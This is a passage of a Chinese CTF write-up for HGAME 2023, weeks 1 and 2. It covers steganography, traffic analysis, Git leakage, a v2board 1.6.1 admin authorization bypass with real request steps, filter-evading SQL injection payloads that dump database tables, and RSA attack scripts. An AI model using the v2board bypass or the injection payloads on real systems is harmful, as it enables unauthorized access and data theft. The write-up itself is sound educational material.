class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    key = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;j&#125;</span>.png&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        encimg=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br><br>        im=xorImg(key,encimg)<br>        im.save(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;j&#125;</span>.<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/16.png" class=""><h3 id="test-your-ida"><a class="markdownIt-Anchor" href="#test-your-ida"></a> test your IDA</h3><p>查一下64位，IDA打开看到flag</p><img src="/2023/01/05/HGAME/5.png" class=""><h3 id="e99p1ant_want_girlfriend"><a class="markdownIt-Anchor" href="#e99p1ant_want_girlfriend"></a> e99p1ant_want_girlfriend</h3><p>拿到一张图片，看起来那个人下面好像少了一点，直接修改长度</p><img src="/2023/01/05/HGAME/1.png" class=""><img src="/2023/01/05/HGAME/2.png" class=""><h3 id="神秘的海报"><a class="markdownIt-Anchor" href="#神秘的海报"></a> 神秘的海报</h3><p>附件是一张HGAME比赛的海报</p><img src="/2023/01/05/HGAME/7.png" class=""><p>用Stegsolve打开,尝试LSB隐写</p><img src="/2023/01/05/HGAME/8.png" class=""><p>整段话提取出来是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Sure enough, you still remember  what we  talked a bout at  that <span class="hljs-type">time</span>! This  <span class="hljs-keyword">is</span> part  <span class="hljs-keyword">of</span> the secret: ` hgame&#123;U_ Kn0w_LSB&amp;W`.I put the rest <span class="hljs-keyword">of</span> th e content here,  https://drive.google.com/file/d/<span class="hljs-number">13</span>kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/<span class="hljs-keyword">view</span>?usp=sharing, <span class="hljs-keyword">if</span> you directly <span class="hljs-keyword">access</span> the g oogle drive cloud disk download  <span class="hljs-keyword">in</span> China, it will be very slow,  you can try <span class="hljs-keyword">to</span> u se Scientific Internet <span class="hljs-keyword">access</span> solves the problem <span class="hljs-keyword">of</span> slow <span class="hljs-keyword">or</span> inaccessible <span class="hljs-keyword">access</span>  <span class="hljs-keyword">to</span> <span class="hljs-keyword">external</span> network resources. This <span class="hljs-keyword">is</span> my favorite music, there  <span class="hljs-keyword">is</span> another part  <span class="hljs-keyword">of</span> the secret <span class="hljs-keyword">in</span>  the music, I use Steghide <span class="hljs-keyword">to</span> encrypt, the <span class="hljs-keyword">password</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> the  <span class="hljs-number">6</span>-digit <span class="hljs-keyword">password</span>  we agreed at the <span class="hljs-type">time</span>, even <span class="hljs-keyword">if</span>  someone <span class="hljs-keyword">else</span> finds <span class="hljs-keyword">out</span> here, it  should <span class="hljs-keyword">not</span> be so  easy <span class="hljs-keyword">to</span><br></code></pre></td></tr></table></figure><p>这里给了一半的flag，另一半要访问网站<a href="https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing">https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing</a> ，下载音频（要有梯子，不然下不来）</p><p>里面说了用Steghide加密的，直接上网搜一下Steghide的用法<a href="https://www.jianshu.com/p/c3679f805a0c">https://www.jianshu.com/p/c3679f805a0c</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>steghide   <span class="hljs-comment">#安装</span><br>steghide info <span class="hljs-keyword">Bossanova.wav </span>  <span class="hljs-comment">#查看隐藏的文件</span><br>steghide <span class="hljs-keyword">extract </span>-sf <span class="hljs-keyword">Bossanova.wav </span> <span class="hljs-comment">#提取隐藏的文件</span><br></code></pre></td></tr></table></figure><p>得到flag2.txt <code>恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！</code></p><p><code>hgame&#123;U_ Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><h3 id="where-am-i"><a class="markdownIt-Anchor" href="#where-am-i"></a> Where am I</h3><p>给了一个流量包</p><p>因为图片是上传到网盘，所以导出HTTP对象,得到两个文件,一个里面只写了<code>upload successful</code></p><p>另一个则有含有压缩包，<code>binwalk -e file </code>分离，用winhex打开，把头尾多余的文字删除</p><img src="/2023/01/05/HGAME/11.jpg" class=""><img src="/2023/01/05/HGAME/12.png" class=""><p>打开发现文件头错误，应该是伪加密</p><p>将24修改为20</p><img src="/2023/01/05/HGAME/13.png" class=""><p>解压得到图片，linux下用exfitool查看信息</p><img src="/2023/01/05/HGAME/14.png" class=""><p><code>hgame&#123;116_24_1488E_39_54_5418N&#125;</code></p><h3 id="test_nc"><a class="markdownIt-Anchor" href="#test_nc"></a> test_nc</h3><p>直接nc <a href="http://week-1.hgame.lwsec.cn">week-1.hgame.lwsec.cn</a> 31750</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br><span class="hljs-comment">#bin</span><br><span class="hljs-comment">#dev</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#lib</span><br><span class="hljs-comment">#lib32</span><br><span class="hljs-comment">#lib64</span><br><span class="hljs-comment">#vuln</span><br><span class="hljs-built_in">cat</span> flag<br><span class="hljs-comment">#hgame&#123;1b32ad7a265058ea9f2ccc866b97085bb10c4f14&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week-2"><a class="markdownIt-Anchor" href="#week-2"></a> Week 2</h2><h3 id="git-leakage"><a class="markdownIt-Anchor" href="#git-leakage"></a> Git Leakage</h3><p>题目直接说了是Git 泄露</p><p>那就直接<code>python3 Githack.py http://week-2.hgame.lwsec.cn:32140/.git</code></p><p>得到文件Th1s_1s-flag</p><p><code>hgame&#123;Don't^put*Git-in_web_directory&#125;</code></p><h3 id="v2board"><a class="markdownIt-Anchor" href="#v2board"></a> v2board</h3><p>需要越权获得admin的权限，查看admin订阅的token</p><p>先随便注册个邮箱进去看看，都没有什么有用的信息</p><p>猜测是v2board的漏洞，查看源码知道是1.6.1版本的</p><p>上网搜<a href="https://www.ctfiot.com/86202.html">v2board越权访问漏洞</a></p><p>这里的漏洞是</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">鉴权方式变为从Redis中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限<br> <span class="hljs-literal">Admin</span>.php 文件中只验证了 authrization 是否在 Redis的缓存中，所以当注册任意一个用户进行登陆后获取到 auth_data 就可以任意调用 管理员的接口<br></code></pre></td></tr></table></figure><p>先随意注册一个邮箱</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">email:<span class="hljs-keyword">admin</span>@qq.com<br><span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span>@qq.com<br></code></pre></td></tr></table></figure><p>登录后会返回一个auth_data字段<code>YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code></p><p>然后访问/api/v1/admin/user/fetch ,并在请求头加上<code>authorization:YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code>,</p><p>访问得到</p><img src="/2023/01/05/HGAME/9.png" class=""><p>可以发现有一个<code>admin@example.com</code>不是我们注册的，那就是admin了，订阅链接的token=<code>39d580e71705f6abac9a414def74c466</code></p><h3 id="search-commodity"><a class="markdownIt-Anchor" href="#search-commodity"></a> Search Commodity</h3><p>弱密码爆破<code>admin123</code></p><p>接下来就是sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1/*/**/*/oorrder/*/**/*/by/*/**/*/3%23<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,datadatabasebase(),3%23   se4rch<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(table_name)frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;se4rch&#x27;),3%23   5ecret15here,L1st,user1nf0<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(column_name)frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;5ecret15here&#x27;),3%23f14gggg1shere<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(f14gggg1shere)frfromom/*/**/*/5ecret15here),3%23   hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;<br></code></pre></td></tr></table></figure><h3 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> Rabin</h3><p>Rabin加密方案：<br />选择两个大素数p和q做为私钥</p><p>计算n = p * q做为公钥</p><p>若明文为m，则密文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c ≡ m^{2}(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>实际做题中，加密指数e不仅限于2，所有和n不互素的都有可能</p><p>加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">kbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = getPrime(kbits)<br>        q = getPrime(kbits)<br>        <span class="hljs-keyword">if</span> p % <span class="hljs-number">4</span> == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q % <span class="hljs-number">4</span>== <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> p, q<br><br>p ,q = gen_key(<span class="hljs-number">256</span>)<br>flag =  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(pt, <span class="hljs-number">2</span>, p*q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p=<span class="hljs-subst">&#123;p&#125;</span>\nq=<span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br><span class="hljs-string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br><span class="hljs-string">c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>使用<a href="https://sagecell.sagemath.org/">sagemath</a>求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">p =<span class="hljs-number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br>q =<span class="hljs-number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br>c =<span class="hljs-number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br>e = <span class="hljs-number">2</span><br>R.&lt;x&gt; = Zmod(p)[] <span class="hljs-comment">#将x作为需要求得的未知数，p为素数</span><br>f = x^e-c<br>r1 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()] <span class="hljs-comment">#f.roots()返回求解出来的所有解的列表</span><br>R.&lt;x&gt; = Zmod(q)[]<br>f = x^e-c<br>r2 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()]<br>m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> r2:<br>        m.append(crt([i,j],[p,q])) <span class="hljs-comment">#crt求解中国剩余定理，第一个参数为余数列表，第二个参数为模数列表</span><br><span class="hljs-built_in">print</span>(m) <span class="hljs-comment">#将所有可能的m输出，复制到python里long_to_bytes()</span><br><br></code></pre></td></tr></table></figure><p>到Python中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag=[<span class="hljs-number">2372237455851842898349117425227584430588749791480564189568122389688124352290664541063989455711371754963358673223097609351443007448201859216160320647129068</span>, <span class="hljs-number">202822073494981439416400155064048668390596366869305553433016288033759387909443994349181</span>, <span class="hljs-number">6449323225107597053933443750923454260964062647115639999185223478236408615216462580775151285384372189740266233875418656692511620093103204244355042080455728</span>, <span class="hljs-number">4077085769255754155584326325695869830375312855635075809617101088548487084999293021150578229828064483445298157019190352894501628932935104416104165427675841</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(i))<br></code></pre></td></tr></table></figure><p><code>hgame&#123;That'5_s0_3asy_to_s@lve_r@bin&#125;</code></p><h3 id="rsa-大冒险1"><a class="markdownIt-Anchor" href="#rsa-大冒险1"></a> RSA 大冒险1</h3><p>4关挑战，通过拿flag</p><p>直接上解题代码</p><p>challenge 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">0x56908e6a818ea207ac312c0b204d94ee651cd7b26313fbfdcfb2406828ad379fa12529cf3db2a4d903</span><br>n=<span class="hljs-number">209770295744242916299788862153266483138979976716588739416239543100484342323180172904935777216735461</span><br>p=<span class="hljs-number">333053352923682535111489833655011123013</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><br><span class="hljs-comment">#m&lt;n_But_also_m&lt;p</span><br></code></pre></td></tr></table></figure><p>challenge 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> math<br><br>c1 = <span class="hljs-number">0xa757143e3ea0753ac3c15e0dd05bc6eb58bdf947203c321417fb2739a9072ee5969b7ae017bb68c46969ceddccb0b3e8e27f0b79ba011065e9e0c0d6ec04c7735bc7d2d3d55119f3852c78264c40c9b36fffbc8741515d6d43f4aeba50186ceb45952617d8f4d15e0c0e84397d58aad6b9d8df15adc1f29c4c37addfb6f901d</span><br>c2 = <span class="hljs-number">0xca21ea2228e901614120f89036e62c36f385343c9b15a43c47d23097bb6eb6df4cc6aac315f283b35bf3e00612fea7ee2711248615c10b61475e96f57a94ecfb49b1b60495353c6232510e995251c6a3744193f0e3c10bc1cb9f8bbab19b7cd2a67fab178ca7fe6263aa22c460b0b51af14c9dc2adbe6aa9539e05b214dc1bf</span><br>n1 = <span class="hljs-number">99117167225742621252747360705927288427226074291111147359767727530232979959246961303002594953502494314944737381744946594792258965951764387793904602632138990093085873703735789929744541078195532792040220263365256453293757661668916687151993893223835585293806890903078811527485480385874789904018025085480072921947</span><br>n2 = <span class="hljs-number">90708232882117493164546448126493812176926972474525609918179199222944319390160880291246879414964890005116911514705462257621255399480873008530781044973928567730151038933999620333681189161328502592514982955942546631546678204758589280772127887941509353870320299744541746637191024740549289281821158392283041483783</span><br>p = math.gcd(n1, n2)<br>e = <span class="hljs-number">65537</span><br>d = libnum.invmod(e, (p - <span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c1, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><span class="hljs-comment">#make_all_modulus_independent</span><br></code></pre></td></tr></table></figure><p>challenge 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">114515838473805006712847594704380677940280499969617865451903741803970304896753055873744402239365107537263730326351655179037631201887020732179784578687179230556396662015803684388855028443206818232761239630564571111262306517782298740762072717669765284942698987218518593869320732633953301487410854175666320988421</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200000000</span>):<br>    <span class="hljs-keyword">if</span> gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>        res = gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(i, res)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res)))<br>        <span class="hljs-keyword">break</span><br>   <br><span class="hljs-comment">#encrypt_exponent_should_be_bigger</span><br></code></pre></td></tr></table></figure><p>challenge 4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#共模攻击</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">82359994555957061700863027886322811457676109608256083872064055426219259168794095530809575147825700925031273940545355557102788577532782300265260138429958167909187144110770618006792214374768047428973415244582649583493180328548963991180770977787901825467721537824736537797481709634514539903832239828285924506839</span><br>e1 = <span class="hljs-number">108289</span><br>e2 = <span class="hljs-number">81013</span><br>s = gcdext(e1, e2)<br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = -s[<span class="hljs-number">2</span>]<br><br>c1 = <span class="hljs-number">0x64d0825cadb4374aec113fcac2d752bb71d4586a9bb02b6d82f76fda0b642af037447b9cf76f80b1f4066bcf94dd6538b253a02aaa8f956edbd20c2a2f311b1f554ff7f968f124a8472d6d5306d9c96e16b737ee5675061e4de58bc6b5fb7f3cc5f92647c6aba9010b03b2c5d4d28b031d77205bc238b19785783e80e3a9146d</span><br>c2 = <span class="hljs-number">0x1eed249f0b99aa87992b59387ec11a0b36022aa475c3917d6a85c36745c5d0e7275c16e9879e2192491783533941b50cd97a0f4f32803df7118288c89f4e22555ca98d0417063dbb81c60e2d1a2e696bcec16660cd396aaf9b5743c1944b28adb33f73f70f3aa5fed5cd2cef0c9920dd54e68b34f40fe31e3662f1d9d484fff3</span><br><span class="hljs-comment"># e2=9647291</span><br>c2 = invert(c2, n)<br>m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment">#never_uese_same_modulus</span><br></code></pre></td></tr></table></figure><p><code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code></p><h3 id="包里有什么"><a class="markdownIt-Anchor" href="#包里有什么"></a> 包里有什么</h3><p>看了官方wp，发现想多了，不需要求长度和w</p><p>根据扩展的欧几里得算法直接可以求出w的逆元</p><img src="/2023/01/05/HGAME/17.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcdext<br>m = <span class="hljs-number">1528637222531038332958694965114330415773896571891017629493424</span><br>b0 = <span class="hljs-number">69356606533325456520968776034730214585110536932989313137926</span><br>c = <span class="hljs-number">93602062133487361151420753057739397161734651609786598765462162</span><br>winv = gcdext(b0, m)[<span class="hljs-number">1</span>]<br>v = c * winv % m &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-comment">#乘上w的逆元再除以2</span><br>flag = <span class="hljs-string">&#x27;hgame&#123;&#x27;</span> + long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(v)[<span class="hljs-number">2</span>:][::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)).decode() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;1t&#x27;s_4n_3asy_ba9_isn7_it?&#125;</span><br></code></pre></td></tr></table></figure><h3 id="sign-in-pro-max"><a class="markdownIt-Anchor" href="#sign-in-pro-max"></a> Sign In Pro Max</h3><p>附件如下</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1, <span class="hljs-keyword">is</span> seems like baseXX: QVl5Y3BNQjE1ektibnU3SnN6M0tGaQ==<br>Part2, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: c629d83ff9804fb62202e90b0945a323<br>Part3, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: <span class="hljs-number">99</span>f3b3ada2b4675c518ff23cbd9539da05e2f1f8<br>Part4, the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3 <span class="hljs-keyword">with</span> <span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds: <span class="hljs-number">1838</span>f8d5b547c012404e53a9d8c76c56399507a2b017058ec7f27428fda5e7db<br>Ufwy5 nx <span class="hljs-number">0</span>gh0jf61i21h, stb uzy fqq ymj ufwyx ytljymjw, its<span class="hljs-symbol">&#x27;y</span> ktwljy ymj ktwrfy.<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1是base加密：base32+base58+base64f51d3a18<br>Part2,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size 是md5f91c<br>Part3,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size 是sha-<span class="hljs-number">1</span><span class="hljs-number">4952</span><br>Part4,the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3是sha-<span class="hljs-number">2</span>，<span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds是sha-<span class="hljs-number">256</span>a3ed<br>最后一句是凯撒加密，位移<span class="hljs-number">5</span>，Part5 <span class="hljs-keyword">is</span> <span class="hljs-number">0</span>bc0ea61d21c, now put <span class="hljs-keyword">all</span> the parts together, don<span class="hljs-symbol">&#x27;t</span> forget the format<br></code></pre></td></tr></table></figure><p>以为flag就是hgame{f51d3a18f91c4952a3ed0bc0ea61d21c}</p><p>结果交上去是错的，发现part5后面还有一句don’t forget format,尝试每部分之间加<code>_</code>,发现还是错误，换成<code>-</code>就对了</p><p><code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code></p><h2 id="week-3"><a class="markdownIt-Anchor" href="#week-3"></a> Week 